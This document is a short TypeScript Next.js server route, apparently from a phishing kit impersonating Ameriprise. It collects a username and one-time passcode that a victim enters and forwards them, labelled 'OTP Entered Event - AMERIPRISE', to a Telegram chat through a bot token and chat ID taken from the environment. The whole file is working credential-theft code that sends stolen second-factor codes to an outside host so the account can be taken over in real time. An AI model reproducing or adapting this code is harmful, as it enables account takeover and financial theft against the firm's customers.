import { NextResponse } from "next/server";
import { sendToTelegram } from "@/lib/telegram";

export const runtime = "nodejs";

type OtpEntryRequest = {
  event?: string;
  username?: string;
  otp?: string;
  time?: string;
};

export async function notifyOtp(req: Request): Promise<Response | null> {
    try {
    const body = (await req.json().catch(() => null)) as OtpEntryRequest | null;

    const event =
      typeof body?.event === "string" ? body.event : "otp_entered";

    const username =
      typeof body?.username === "string" ? body.username.trim() : "";

    const otp = typeof body?.otp === "string" ? body.otp.trim() : "";

    const time =
      typeof body?.time === "string" ? body.time : new Date().toISOString();

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return NextResponse.json(
        { error: "Missing TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID" },
        { status: 500 }
      );
    }

    const text = [
      "🧾 OTP Entered Event - AMERIPRISE",
      "",
      `Event: ${event}`,
      `Username: ${username || "(empty)"}`,
      `OTP: ${otp || "(empty)"}`,
      `Time: ${time}`,
    ].join("\n");

    await sendToTelegram(text);

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
 }